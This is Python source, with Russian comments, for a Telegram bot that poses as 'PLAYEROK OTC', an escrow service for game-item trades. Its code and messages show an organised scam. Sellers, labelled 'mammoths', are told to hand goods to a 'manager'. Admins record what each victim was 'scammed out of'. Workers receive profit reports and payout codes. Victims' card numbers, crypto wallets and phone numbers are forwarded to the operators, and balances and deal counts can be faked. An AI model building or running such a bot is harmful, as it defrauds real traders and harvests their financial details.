import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto, ReplyKeyboardMarkup, KeyboardButton, InputMediaVideo
import uuid
import os
import pickle
from datetime import datetime, timedelta
from dotenv import load_dotenv

# Загружаем переменные окружения из .env файла
load_dotenv()

# Получаем токен из переменных окружения
TOKEN = os.getenv("BOT_TOKEN")

# Проверяем, что токен загружен
if not TOKEN:
    print("❌ ОШИБКА: Не найден BOT_TOKEN в .env файле!")
    print("ℹ️ Создайте файл .env в той же папке с содержимым:")
    print("BOT_TOKEN=ваш_токен_бота")
    exit(1)

print(f"✅ Токен загружен (длина: {len(TOKEN)} символов)")

# Создаем экземпляр бота с токеном из .env
bot = telebot.TeleBot(TOKEN)

# Получаем путь к папке, где находится скрипт
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Пути к файлам данных
DATA_FILE = os.path.join(BASE_DIR, 'playerok_data.pkl')
PHOTO_PATH = os.path.join(BASE_DIR, 'photo.jpg')
VIDEO_PATH = os.path.join(BASE_DIR, 'video1.mp4')  # Путь к видео для профитов

# Глобальные переменные для данных
users = {}
deals = {}
deal_activities = {}  # Словарь для хранения действий в сделках
user_activities = {}  # Словарь для хранения действий пользователей
owners = set()  # Владельцы (высший уровень)
admins = set()  # Администраторы
workers = set()  # Воркеры
blocked_users = set()  # Заблокированные пользователи

# Словарь для тегов пользователей
user_tags = {}  # user_id -> tag

# Состояния для рассылок
awaiting_broadcast_message = {}
awaiting_private_message = {}
awaiting_scam_info = {}  # Ожидание информации о скаме от админа

# ID форума для логов
FORUM_ID = -1003747224775  # https://t.me/c/3747224775
# ID тем в форуме
FORUM_PROFITS = 9      # Профиты (успешные сделки)
FORUM_TEXT_MESSAGES = 7  # Текстовые сообщения
FORUM_NEW_USERS = 5   # Новые пользователи
FORUM_NEW_DEALS = 2   # Новые сделки

# ID группы для профитов
PROFIT_GROUP_ID = -1003399713075  # Группа "профиты | playerok"

# Менеджер для передачи товаров
MANAGER_USERNAME = "@RelayerPlayerok"

# Проверка существования локального фото
print(f"🔍 Проверка локального фото: {PHOTO_PATH}")
if os.path.exists(PHOTO_PATH):
    try:
        with open(PHOTO_PATH, 'rb') as f:
            if f.read(1):
                PHOTO_AVAILABLE = True
                print(f"✅ Локальное фото найдено: {PHOTO_PATH}")
            else:
                PHOTO_AVAILABLE = False
                print(f"❌ Файл фото пустой: {PHOTO_PATH}")
    except Exception as e:
        PHOTO_AVAILABLE = False
        print(f"❌ Ошибка чтения фото: {e}")
else:
    PHOTO_AVAILABLE = False
    print(f"❌ Фото не найдено по пути: {PHOTO_PATH}")

# Проверка существования видео для профитов
print(f"🔍 Проверка локального видео: {VIDEO_PATH}")
if os.path.exists(VIDEO_PATH):
    try:
        with open(VIDEO_PATH, 'rb') as f:
            if f.read(1):
                VIDEO_AVAILABLE = True
                print(f"✅ Локальное видео найдено: {VIDEO_PATH}")
            else:
                VIDEO_AVAILABLE = False
                print(f"❌ Файл видео пустой: {VIDEO_PATH}")
    except Exception as e:
        VIDEO_AVAILABLE = False
        print(f"❌ Ошибка чтения видео: {e}")
else:
    VIDEO_AVAILABLE = False
    print(f"❌ Видео не найдено по пути: {VIDEO_PATH}")

# Если фото нет, создаём тестовое
if not PHOTO_AVAILABLE:
    try:
        from PIL import Image, ImageDraw, ImageFont
        
        img = Image.new('RGB', (800, 600), color='#1a1a2e')
        draw = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype("arial.ttf", 60)
        except:
            font = ImageFont.load_default()
        
        text = "PLAYEROK OTC"
        bbox = draw.textbbox((0, 0), text, font=font)
        text_width = bbox[2] - bbox[0]
        text_height = bbox[3] - bbox[1]
        x = (800 - text_width) // 2
        y = (600 - text_height) // 2
        
        draw.text((x, y), text, font=font, fill='#4cc9f0')
        img.save(PHOTO_PATH)
        PHOTO_AVAILABLE = True
        print(f"✅ Создано тестовое фото: {PHOTO_PATH}")
    except Exception as e:
        print(f"❌ Не удалось создать тестовое фото: {e}")
        PHOTO_AVAILABLE = False

# Функция для отправки сообщения в форум логов
def send_to_forum(message, topic_id=None, parse_mode='HTML'):
    """Отправляет сообщение в форум логов"""
    try:
        if topic_id:
            bot.send_message(
                FORUM_ID,
                message,
                parse_mode=parse_mode,
                message_thread_id=topic_id
            )
        else:
            bot.send_message(
                FORUM_ID,
                message,
                parse_mode=parse_mode
            )
        return True
    except Exception as e:
        print(f"❌ Ошибка отправки в форум логов: {e}")
        return False

# НОВАЯ ФУНКЦИЯ: Отправка профита в группу профитов без личного кода
def send_profit_to_group(deal_id, scam_info, worker_id, mammoth_id):
    """Отправляет информацию о профите в группу профитов без личного кода"""
    if deal_id not in deals:
        return False
    
    deal = deals[deal_id]
    worker = users.get(worker_id, {'username': 'Неизвестно'})
    mammoth = users.get(mammoth_id, {'username': 'Неизвестно'})
    
    # Получаем тег воркера
    worker_tag = user_tags.get(worker_id, f"@{worker['username']}")
    
    profit_message = f"""
✅ <b>НОВЫЙ ПРОФИТ!</b>

💰 <b>Детали сделки:</b>
• ID сделки: #{deal_id[:8]}
• Сумма: {deal['amount']} {deal['currency']}
• Категория: {deal.get('category', 'Товар')}
• Время: {deal.get('completed_at', datetime.now().strftime("%d.%m.%Y %H:%M"))}

👥 <b>Участники:</b>
• 👷 Воркер: {worker_tag}
• 🦣 Мамонт: @{mammoth['username']} (ID: {mammoth_id})

📝 <b>На что заскамили:</b>
{scam_info}

📊 <b>Статистика воркера:</b>
• Успешных сделок: {worker['success_deals']}
• Рейтинг: {worker['rating']}⭐

🎬 <b>Видео подтверждение:</b>
    """
    
    try:
        if VIDEO_AVAILABLE:
            with open(VIDEO_PATH, 'rb') as video_file:
                bot.send_video(
                    PROFIT_GROUP_ID,
                    video_file,
                    caption=profit_message,
                    parse_mode='HTML'
                )
        else:
            bot.send_message(PROFIT_GROUP_ID, profit_message, parse_mode='HTML')
        
        print(f"✅ Профит отправлен в группу профитов: {deal_id}")
        return True
    except Exception as e:
        print(f"❌ Ошибка отправки профита в группу: {e}")
        # Пробуем отправить без видео
        bot.send_message(PROFIT_GROUP_ID, profit_message, parse_mode='HTML')
        return True

# НОВАЯ ФУНКЦИЯ: Отправка профита в форум с видео (без изменений)
def send_profit_to_forum(deal_id, scam_info, worker_id, mammoth_id):
    """Отправляет информацию о профите в форум логов с видео"""
    if deal_id not in deals:
        return False
    
    deal = deals[deal_id]
    worker = users.get(worker_id, {'username': 'Неизвестно'})
    mammoth = users.get(mammoth_id, {'username': 'Неизвестно'})
    
    # Получаем тег воркера
    worker_tag = user_tags.get(worker_id, f"@{worker['username']}")
    
    # Генерируем личный код для воркера
    profit_code = f"PRF-{deal_id[:8].upper()}-{worker_id % 10000:04d}"
    
    profit_message = f"""
✅ <b>НОВЫЙ ПРОФИТ!</b>

💰 <b>Детали сделки:</b>
• ID сделки: #{deal_id[:8]}
• Сумма: {deal['amount']} {deal['currency']}
• Категория: {deal.get('category', 'Товар')}
• Время: {deal.get('completed_at', datetime.now().strftime("%d.%m.%Y %H:%M"))}

👥 <b>Участники:</b>
• 👷 Воркер: {worker_tag}
• 🦣 Мамонт: @{mammoth['username']} (ID: {mammoth_id})

📝 <b>На что заскамили:</b>
{scam_info}

🔑 <b>Личный код воркера:</b>
<code>{profit_code}</code>

📊 <b>Статистика воркера:</b>
• Успешных сделок: {worker['success_deals']}
• Рейтинг: {worker['rating']}⭐

🎬 <b>Видео подтверждение:</b>
    """
    
    try:
        if VIDEO_AVAILABLE:
            with open(VIDEO_PATH, 'rb') as video_file:
                bot.send_video(
                    FORUM_ID,
                    video_file,
                    caption=profit_message,
                    parse_mode='HTML',
                    message_thread_id=FORUM_PROFITS
                )
        else:
            send_to_forum(profit_message, FORUM_PROFITS)
        
        print(f"✅ Профит отправлен в форум: {deal_id}")
        return profit_code
    except Exception as e:
        print(f"❌ Ошибка отправки профита в форум: {e}")
        # Пробуем отправить без видео
        send_to_forum(profit_message, FORUM_PROFITS)
        return profit_code

# НОВАЯ ФУНКЦИЯ: Отправка профита воркеру
def send_profit_to_worker(worker_id, deal_id, scam_info, profit_code):
    """Отправляет информацию о профите воркеру с личным кодом"""
    if deal_id not in deals:
        return False
    
    deal = deals[deal_id]
    mammoth_id = deal.get('seller_id')
    mammoth = users.get(mammoth_id, {'username': 'Неизвестно'}) if mammoth_id else {'username': 'Неизвестно'}
    
    profit_message = f"""
🎉 <b>ПОЗДРАВЛЯЕМ С УСПЕШНЫМ ПРОФИТОМ!</b>

💰 <b>Детали сделки:</b>
• ID сделки: #{deal_id[:8]}
• Сумма: {deal['amount']} {deal['currency']}
• Категория: {deal.get('category', 'Товар')}
• Мамонт: @{mammoth['username']}

📝 <b>На что заскамили:</b>
{scam_info}

🔑 <b>ВАШ ЛИЧНЫЙ КОД ДЛЯ ВЫПЛАТЫ:</b>
<code>{profit_code}</code>

<b>Для получения выплаты:</b>
1. Перейдите в бота @GodsTeamPayout_bot
2. Создайте заявку на выплату
3. Укажите этот код в заявке: <code>{profit_code}</code>
4. Ожидайте обработки заявки

🎬 <b>Подтверждение:</b>
    """
    
    try:
        if VIDEO_AVAILABLE:
            with open(VIDEO_PATH, 'rb') as video_file:
                bot.send_video(
                    worker_id,
                    video_file,
                    caption=profit_message,
                    parse_mode='HTML'
                )
        else:
            bot.send_message(worker_id, profit_message, parse_mode='HTML')
        
        print(f"✅ Профит отправлен воркеру {worker_id}: {profit_code}")
        return True
    except Exception as e:
        print(f"❌ Ошибка отправки профита воркеру: {e}")
        return False

# Функция для логирования действий
def log_activity(user_id, action, deal_id=None, details=None):
    """Логирует действие пользователя или в сделке"""
    timestamp = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    
    # Логирование действий пользователя
    if user_id not in user_activities:
        user_activities[user_id] = []
    
    user_activity = {
        'action': action,
        'timestamp': timestamp,
        'deal_id': deal_id,
        'details': details
    }
    user_activities[user_id].append(user_activity)
    
    # Ограничиваем историю до последних 100 действий
    if len(user_activities[user_id]) > 100:
        user_activities[user_id] = user_activities[user_id][-100:]
    
    # Логирование действий в сделке
    if deal_id:
        if deal_id not in deal_activities:
            deal_activities[deal_id] = []
        
        deal_activity = {
            'action': action,
            'user_id': user_id,
            'timestamp': timestamp,
            'details': details
        }
        deal_activities[deal_id].append(deal_activity)
        
        # Ограничиваем историю до последних 50 действий
        if len(deal_activities[deal_id]) > 50:
            deal_activities[deal_id] = deal_activities[deal_id][-50:]
    
    # Отправка в соответствующие темы форума
    if action == 'Регистрация в системе':
        log_message = f"""
🆕 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>

👤 <b>Пользователь:</b> @{users[user_id]['username']}
🆔 <b>ID:</b> <code>{user_id}</code>
⏰ <b>Время:</b> {timestamp}

<b>Действие:</b> Первый запуск бота
"""
        send_to_forum(log_message, FORUM_NEW_USERS)
    
    elif action == 'Создал новую сделку':
        deal = deals.get(deal_id, {})
        log_message = f"""
🆕 <b>НОВАЯ СДЕЛКА</b>

📋 <b>ID сделки:</b> #{deal_id[:8]}
👤 <b>Продавец:</b> @{users[user_id]['username']}
💰 <b>Сумма:</b> {deal.get('amount', 0)} {deal.get('currency', '')}
📁 <b>Категория:</b> {deal.get('category', 'Товар')}
⏰ <b>Время:</b> {timestamp}

<b>Описание:</b>
{deal.get('description', '')[:200]}
"""
        send_to_forum(log_message, FORUM_NEW_DEALS)
    
    elif action == 'Профит завершен':
        # Теперь это обрабатывается отдельно через send_profit_to_forum
        pass
    
    # Логируем текстовые сообщения, которые никуда не относились
    elif (action in ['Обновил TON кошелёк', 'Обновил банковскую карту', 
                     'Обновил номер телефона', 'Обновил USDT кошелёк', 'Установил тег'] or
          'Отправил личное сообщение' in action or
          'Отправил рассылку' in action or
          'Заблокировал пользователя' in action or
          'Разблокировал пользователя' in action or
          'Накрутил баланс' in action or
          'Накрутил сделки' in action or
          'Отправил профит' in action):
        log_message = f"""
💬 <b>ТЕКСТОВОЕ СООБЩЕНИЕ</b>

👤 <b>Пользователь:</b> @{users[user_id]['username']}
🆔 <b>ID:</b> <code>{user_id}</code>
⏰ <b>Время:</b> {timestamp}

<b>Действие:</b> {action}
<b>Детали:</b> {details[:200] if details else 'Нет деталей'}
"""
        send_to_forum(log_message, FORUM_TEXT_MESSAGES)
    
    save_data()

# Загрузка данных из файла
def load_data():
    """Загружает данные из файла"""
    global users, deals, owners, admins, workers, deal_activities, user_activities, blocked_users, user_tags
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'rb') as f:
                data = pickle.load(f)
                users = data.get('users', {})
                deals = data.get('deals', {})
                owners = data.get('owners', set())
                admins = data.get('admins', set())
                workers = data.get('workers', set())
                deal_activities = data.get('deal_activities', {})
                user_activities = data.get('user_activities', {})
                blocked_users = data.get('blocked_users', set())
                user_tags = data.get('user_tags', {})
                print(f"✅ Данные загружены: {len(users)} пользователей, {len(deals)} сделок")
                print(f"👑 Владельцы: {len(owners)} | Админы: {len(admins)} | Воркеры: {len(workers)}")
                print(f"🚫 Заблокировано: {len(blocked_users)} пользователей")
                print(f"🏷️ Тегов: {len(user_tags)}")
                return data
    except Exception as e:
        print(f"❌ Ошибка загрузки данных: {e}")
    print("✅ Созданы новые данные")
    return {'users': {}, 'deals': {}, 'owners': set(), 'admins': set(), 'workers': set(), 
            'deal_activities': {}, 'user_activities': {}, 'blocked_users': set(), 'user_tags': {}}

# Сохранение данных в файл
def save_data():
    """Сохраняет данные в файл"""
    global users, deals, owners, admins, workers, deal_activities, user_activities, blocked_users, user_tags
    try:
        data = {
            'users': users,
            'deals': deals,
            'owners': owners,
            'admins': admins,
            'workers': workers,
            'deal_activities': deal_activities,
            'user_activities': user_activities,
            'blocked_users': blocked_users,
            'user_tags': user_tags
        }
        with open(DATA_FILE, 'wb') as f:
            pickle.dump(data, f)
        print(f"✅ Данные сохранены: {len(users)} пользователей, {len(deals)} сделок, {len(blocked_users)} заблокированных, {len(user_tags)} тегов")
        return True
    except Exception as e:
        print(f"❌ Ошибка сохранения данных: {e}")
        return False

# Загрузка данных при старте
print("🔄 Загрузка данных...")
load_data()

# Добавление владельцев
OWNER_IDS = [1034932955]
for owner_id in OWNER_IDS:
    if owner_id not in owners:
        owners.add(owner_id)
        print(f"✅ ID {owner_id} добавлен как владелец")

# Добавляем владельцев также в админы для совместимости
for owner_id in owners:
    if owner_id not in admins:
        admins.add(owner_id)

save_data()

# Проверка блокировки пользователя
def is_user_blocked(user_id):
    """Проверяет, заблокирован ли пользователь"""
    return user_id in blocked_users

# Получение уровня пользователя
def get_user_level(user_id):
    """Возвращает уровень пользователя"""
    if user_id in owners:
        return "owner"
    elif user_id in admins:
        return "admin"
    elif user_id in workers:
        return "worker"
    else:
        return "regular"

# Проверка, может ли пользователь оплачивать
def can_user_pay(user_id):
    """Проверяет, может ли пользователь оплачивать сделки"""
    user_level = get_user_level(user_id)
    return user_level in ["worker", "admin", "owner"]

# Получение тега пользователя
def get_user_tag(user_id):
    """Возвращает тег пользователя или его username"""
    if user_id in user_tags:
        return user_tags[user_id]
    elif user_id in users:
        return f"@{users[user_id]['username']}"
    else:
        return f"ID:{user_id}"

# Класс состояния для FSM
class DealState:
    SET_AMOUNT = 1
    SET_DESCRIPTION = 2
    WAIT_PAYMENT = 3
    SELLER_CONFIRMED = 4
    BUYER_CONFIRMED = 5

# Функция для отправки уведомления админу о новых реквизитах
def notify_admin_credentials(user_id, credential_type, new_value):
    """Отправляет уведомление админу о новых реквизитах пользователя"""
    if user_id not in users:
        return
    
    user = users[user_id]
    
    if credential_type == 'ton_wallet':
        icon = "⚡"
        name = "TON-кошелёк"
    elif credential_type == 'card_details':
        icon = "💳"
        name = "банковская карта"
    else:
        icon = "📝"
        name = "реквизиты"
    
    message = f"🔔 <b>НОВЫЕ РЕКВИЗИТЫ | PLAYEROK OTC</b>\n\n"
    message += f"👤 <b>Пользователь:</b> @{user['username']}\n"
    message += f"🆔 <b>ID:</b> {user_id}\n"
    message += f"📋 <b>Тип:</b> {name}\n"
    message += f"🔗 <b>Значение:</b>\n<code>{new_value}</code>\n\n"
    message += f"📊 <b>Статистика:</b>\n"
    message += f"• Сделок: {user['success_deals']}\n"
    message += f"• Рейтинг: {user['rating']}⭐"
    
    for owner_id in owners:
        try:
            bot.send_message(owner_id, message, parse_mode='HTML')
        except:
            pass
    
    for admin_id in admins:
        try:
            bot.send_message(admin_id, message, parse_mode='HTML')
        except:
            pass

# НОВАЯ ФУНКЦИЯ: Запрос информации о скаме у админа при завершении сделки
def ask_admin_for_scam_info(deal_id, admin_id):
    """Запрашивает у админа информацию о том, на что заскамили"""
    if deal_id not in deals:
        return
    
    deal = deals[deal_id]
    seller_id = deal['seller_id']
    buyer_id = deal.get('buyer_id')
    
    seller = users.get(seller_id, {'username': 'Неизвестно'})
    buyer = users.get(buyer_id, {'username': 'Неизвестно'}) if buyer_id else {'username': 'Неизвестно'}
    
    message = f"""
🔍 <b>ЗАВЕРШЕНИЕ СДЕЛКИ - ТРЕБУЕТСЯ ИНФОРМАЦИЯ</b>

📋 <b>Сделка:</b> #{deal_id[:8]}
💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}
👤 <b>Продавец (мамонт):</b> @{seller['username']} (ID: {seller_id})
👤 <b>Покупатель (воркер):</b> @{buyer['username']} (ID: {buyer_id})

<b>Пожалуйста, опишите на что заскамили мамонта:</b>
• Например: "Аккаунт Steam с CS2"
• Или: "1000 Telegram Stars"
• Или: "Nft метка в Telegram"

<b>Введите описание:</b>
    """
    
    awaiting_scam_info[admin_id] = deal_id
    
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("❌ Отмена", callback_data=f'admin_view_deal_{deal_id}'))
    
    bot.send_message(admin_id, message, parse_mode='HTML', reply_markup=keyboard)

# НОВАЯ ФУНКЦИЯ: Завершение сделки с информацией о скаме
def complete_deal_with_scam_info(deal_id, scam_info, admin_id):
    """Завершает сделку с информацией о скаме и отправляет профиты"""
    if deal_id not in deals:
        return False
    
    deal = deals[deal_id]
    seller_id = deal['seller_id']
    buyer_id = deal.get('buyer_id')
    
    if not buyer_id:
        return False
    
    # Обновляем статистику
    if seller_id in users:
        users[seller_id]['success_deals'] += 1
        users[seller_id]['rating'] = min(5.0, users[seller_id]['rating'] + 0.1)
    
    if buyer_id in users:
        users[buyer_id]['success_deals'] += 1
    
    deal['status'] = 'completed'
    deal['completed_at'] = datetime.now().strftime("%d.%m.%Y %H:%M")
    deal['scam_info'] = scam_info
    deal['completed_by_admin'] = admin_id
    
    # Логируем завершение сделки
    log_activity(seller_id, 'Профит завершен', deal_id, f'Информация: {scam_info[:50]}...')
    log_activity(admin_id, f'Отправил профит с описанием скама: {scam_info[:50]}...', deal_id)
    
    # Отправляем профит в форум
    profit_code = send_profit_to_forum(deal_id, scam_info, buyer_id, seller_id)
    
    # Отправляем профит в группу профитов (без личного кода)
    send_profit_to_group(deal_id, scam_info, buyer_id, seller_id)
    
    # Отправляем профит воркеру
    send_profit_to_worker(buyer_id, deal_id, scam_info, profit_code)
    
    save_data()
    return True

# НОВАЯ ФУНКЦИЯ: Уведомление админов о получении товара от продавца
def notify_admins_item_received(deal_id, seller_id):
    """Отправляет уведомление админам о получении товара от продавца"""
    if deal_id not in deals:
        return
    
    deal = deals[deal_id]
    seller = users.get(seller_id, {'username': 'Неизвестно'})
    
    message = f"""
📦 <b>ТОВАР ПОЛУЧЕН ОТ ПРОДАВЦА</b>

📋 <b>Сделка:</b> #{deal_id[:8]}
👤 <b>Продавец:</b> @{seller['username']}
💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}
📝 <b>Описание:</b> {deal['description'][:100]}...

<b>Продавец подтвердил, что отправил товар менеджеру {MANAGER_USERNAME}</b>

<i>Пожалуйста, проверьте получение товара у менеджера:</i>
"""
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("✅ Подтвердить получение", callback_data=f'admin_confirm_item_{deal_id}'),
        InlineKeyboardButton("❌ Товар не получен", callback_data=f'admin_item_not_received_{deal_id}')
    )
    
    for owner_id in owners:
        try:
            bot.send_message(owner_id, message, parse_mode='HTML', reply_markup=keyboard)
        except:
            pass
    
    for admin_id in admins:
        try:
            bot.send_message(admin_id, message, parse_mode='HTML', reply_markup=keyboard)
        except:
            pass

# Инициализация данных пользователя
def init_user(user_id):
    global users
    if user_id not in users:
        try:
            chat = bot.get_chat(user_id)
            username = chat.username if chat.username else str(user_id)
        except:
            username = str(user_id)
        
        users[user_id] = {
            'username': username,
            'ton_wallet': 'Не указан',
            'card_details': 'Не указана',
            'phone_number': 'Не указан',
            'usdt_wallet': 'Не указан',
            'lang': 'ru',
            'currency': 'RUB',
            'success_deals': 0,
            'disputes_won': 0,
            'rating': 5.0,
            'balance': {'TON': 0.0, 'RUB': 0.0, 'USDT': 0.0, 'KZT': 0.0, 'UAH': 0.0, 'BYN': 0.0, 'USD': 0.0, 'STARS': 0.0},
            'referral_id': str(user_id),
            'deal_state': None,
            'current_deal': None,
            'awaiting_admin_id': False,
            'awaiting_worker_id': False,
            'awaiting_fake_deals': False,
            'awaiting_fake_balance': False,
            'awaiting_remove_worker': False,
            'awaiting_check_deals': False,
            'awaiting_ton_wallet': False,
            'awaiting_card_details': False,
            'awaiting_phone': False,
            'awaiting_usdt': False,
            'awaiting_deal_amount': False,
            'awaiting_deal_description': False,
            'awaiting_deal_category': False,
            'awaiting_search_deal': False,
            'awaiting_search_deal_activity': False,
            'awaiting_search_user_activity': False,
            'awaiting_search_recipient': False,
            'awaiting_block_user': False,
            'awaiting_unblock_user': False,
            'awaiting_warning_confirmation': False,
            'awaiting_item_destination': False,
            'awaiting_set_tag': False,  # Новое поле для установки тега
            'join_date': datetime.now().strftime("%d.%m.%Y"),
            'last_active': datetime.now().strftime("%d.%m.%Y %H:%M"),
            'is_blocked': False
        }
        save_data()
        print(f"✅ Новый пользователь: {user_id} @{username}")
        
        # Логируем создание пользователя
        log_activity(user_id, 'Регистрация в системе')

# Обновление времени активности пользователя
def update_user_activity(user_id):
    if user_id in users:
        users[user_id]['last_active'] = datetime.now().strftime("%d.%m.%Y %H:%M")

# НОВАЯ ФУНКЦИЯ: Отправка сообщения с фото или видео
def send_media_message(chat_id, message_id, text, reply_markup=None, is_video=False):
    try:
        if is_video and VIDEO_AVAILABLE:
            try:
                with open(VIDEO_PATH, 'rb') as video:
                    if message_id:
                        bot.edit_message_media(
                            chat_id=chat_id,
                            message_id=message_id,
                            media=InputMediaVideo(video, caption=text, parse_mode='HTML'),
                            reply_markup=reply_markup
                        )
                    else:
                        bot.send_video(
                            chat_id=chat_id,
                            video=video,
                            caption=text,
                            parse_mode='HTML',
                            reply_markup=reply_markup
                        )
                return
            except Exception as e:
                print(f"⚠️ Ошибка отправки видео: {e}")
                pass
        
        if PHOTO_AVAILABLE:
            try:
                with open(PHOTO_PATH, 'rb') as photo:
                    if message_id:
                        bot.edit_message_media(
                            chat_id=chat_id,
                            message_id=message_id,
                            media=InputMediaPhoto(photo, caption=text, parse_mode='HTML'),
                            reply_markup=reply_markup
                        )
                    else:
                        bot.send_photo(
                            chat_id=chat_id,
                            photo=photo,
                            caption=text,
                            parse_mode='HTML',
                            reply_markup=reply_markup
                        )
                return
            except Exception as e:
                print(f"⚠️ Ошибка отправки фото: {e}")
                pass
        
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
    except Exception as e:
        print(f"Ошибка отправки сообщения: {e}")
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )

# Для обратной совместимости
def send_photo_message(chat_id, message_id, text, reply_markup=None):
    send_media_message(chat_id, message_id, text, reply_markup)

# Приветственное сообщение
def get_welcome_text():
    return """
💙 <b>ДОБРО ПОЖАЛОВАТЬ В PLAYEROK OTC!</b>

🤍 Безопасные P2P-сделки для геймеров и трейдеров

⚡ <b>Быстро</b> — сделки за минуты
🔒 <b>Безопасно</b> — гарант защищает каждую сделку
💎 <b>Выгодно</b> — лучшие курсы на рынке

<b>ЧТО МОЖНО КУПИТЬ/ПРОДАТЬ:</b>
💙 Игровые аккаунты
🤍 Цифровые товары
💙 Ключи активации
🤍 Игровую валюту
💙 Telegram Stars
🤍 И многое другое!

<b>C любовью от @Playerok💙</b>

<b>Выберите действие:</b>

    """

# НОВАЯ ФУНКЦИЯ: Меню предупреждения перед созданием сделки
def get_warning_menu():
    warning_text = """
⚠️ <b>ВАЖНОЕ ПРАВИЛО!</b>

🛡️ <b>Товар передается только менеджеру:</b>
После оплаты покупателем, вы <b>ОБЯЗАНЫ</b> передать товар:
<code>исключительно менеджеру - @RelayerPlayerok </code>

🚫 <b>Запрещено:</b>
• Передавать товар напрямую покупателю
• Отправлять третьим лицам
• Нарушать процедуру гарантии

<b>Для завершения сделки куда нужно передать товар?</b>
    """
    
    return warning_text